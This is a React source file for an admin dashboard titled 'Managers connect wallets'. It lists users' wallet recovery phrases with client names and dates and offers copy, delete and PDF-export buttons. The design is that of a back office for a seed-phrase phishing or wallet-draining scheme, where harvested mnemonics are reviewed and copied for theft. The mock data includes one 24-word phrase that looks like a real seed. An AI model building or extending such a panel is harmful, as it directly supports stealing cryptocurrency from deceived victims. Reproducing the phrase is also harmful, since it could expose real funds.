import { AdminLayout } from "@/components/layout/admin-layout";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Download, Search, Trash2, Copy, Eye } from "lucide-react";
import { useState } from "react";
import { useToast } from "@/hooks/use-toast";

// Mock data based on the reference image
const MOCK_WALLETS = [
  { 
    id: 1, 
    username: "benmacwuche", 
    wallet: "Trust Wallet", 
    phrase: "weather cool have genuine salon village industry security demise tobacco cost sample help crack bottom tiger unveil average slam trust plate pitch goat jungle",
    clientName: "rose mac wuche",
    date: "2025-11-29 09:41:49"
  },
  { 
    id: 2, 
    username: "johndoe123", 
    wallet: "Metamask", 
    phrase: "apple banana cherry dog elephant flower grape house ice juice kite lemon moon night orange piano queen rabbit sun tiger umbrella violin water xylophone yellow zebra",
    clientName: "John Doe",
    date: "2025-11-28 14:20:10"
  },
  { 
    id: 3, 
    username: "cryptoking", 
    wallet: "Coinbase Wallet", 
    phrase: "ocean mountain river valley forest desert sky cloud rain snow wind fire earth metal wood water spirit soul mind body heart life death birth rebirth",
    clientName: "Crypto King",
    date: "2025-11-27 10:15:33"
  }
];

export default function WalletPhrases() {
  const [searchTerm, setSearchTerm] = useState("");
  const { toast } = useToast();

  const filteredWallets = MOCK_WALLETS.filter(item => 
    item.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
    item.clientName.toLowerCase().includes(searchTerm.toLowerCase()) ||
    item.wallet.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied to clipboard",
      description: "Wallet phrase copied successfully.",
    });
  };

  return (
    <AdminLayout>
      <div className="mb-6">
        <h1 className="text-2xl font-normal text-gray-700">Managers connect wallets</h1>
      </div>

      <Card className="border-none shadow-sm bg-white">
        <CardHeader className="pb-0">
          <div className="flex flex-col md:flex-row justify-between items-center gap-4 mb-4">
            <Button className="bg-[#6f42c1] hover:bg-[#5a32a3] text-white font-medium px-6 py-2 h-auto rounded-md text-base w-full md:w-auto">
              Download PDF
            </Button>
            
            <div className="flex items-center gap-2 w-full md:w-auto">
              <span className="text-sm text-gray-600 whitespace-nowrap">Search:</span>
              <Input 
                className="h-9 w-full md:w-64 border-gray-300 focus:border-[#6f42c1] focus:ring-[#6f42c1]" 
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
          </div>
        </CardHeader>
        
        <CardContent>
          <div className="rounded-sm border border-gray-200 overflow-hidden">
            <Table>
              <TableHeader>
                <TableRow className="bg-gray-50 hover:bg-gray-50 border-b border-gray-200">
                  <TableHead className="font-bold text-gray-700 py-4">User Name</TableHead>
                  <TableHead className="font-bold text-gray-700 py-4">Wallet</TableHead>
                  <TableHead className="font-bold text-gray-700 py-4 w-[40%]">Wallet Phrase (Mnemonics)</TableHead>
                  <TableHead className="font-bold text-gray-700 py-4">Client Name</TableHead>
                  <TableHead className="font-bold text-gray-700 py-4">Date</TableHead>
                  <TableHead className="font-bold text-gray-700 py-4 text-center">ACTION</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredWallets.map((item) => (
                  <TableRow key={item.id} className="hover:bg-gray-50 border-b border-gray-100">
                    <TableCell className="py-4 text-gray-600">{item.username}</TableCell>
                    <TableCell className="py-4 text-gray-600">{item.wallet}</TableCell>
                    <TableCell className="py-4 text-gray-500 text-sm leading-relaxed">
                      {item.phrase}
                    </TableCell>
                    <TableCell className="py-4 text-gray-600">{item.clientName}</TableCell>
                    <TableCell className="py-4 text-gray-600 whitespace-nowrap">{item.date}</TableCell>
                    <TableCell className="py-4 text-center">
                      <div className="flex justify-center gap-2">
                        <Button 
                          size="sm" 
                          className="bg-[#6f42c1] hover:bg-[#5a32a3] text-white h-8 w-8 p-0 rounded-md"
                          onClick={() => copyToClipboard(item.phrase)}
                          title="Copy Phrase"
                        >
                          <Copy size={14} />
                        </Button>
                        <Button 
                          size="sm" 
                          variant="destructive"
                          className="h-8 w-8 p-0 rounded-md"
                          title="Delete"
                        >
                          <Trash2 size={14} />
                        </Button>
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
                {filteredWallets.length === 0 && (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-gray-500">
                      No entries found
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          </div>

          <div className="flex flex-col md:flex-row justify-between items-center mt-4 text-sm text-gray-600">
            <div className="mb-4 md:mb-0">
              Showing {filteredWallets.length > 0 ? 1 : 0} to {filteredWallets.length} of {filteredWallets.length} entries
            </div>
            <div className="flex items-center gap-2">
              <Button variant="outline" size="sm" disabled className="text-gray-400">Previous</Button>
              <Button size="sm" className="bg-[#007bff] hover:bg-[#0069d9] text-white h-8 w-8 p-0 rounded-full">1</Button>
              <Button variant="outline" size="sm" disabled className="text-gray-400">Next</Button>
            </div>
          </div>
        </CardContent>
      </Card>
    </AdminLayout>
  );
}
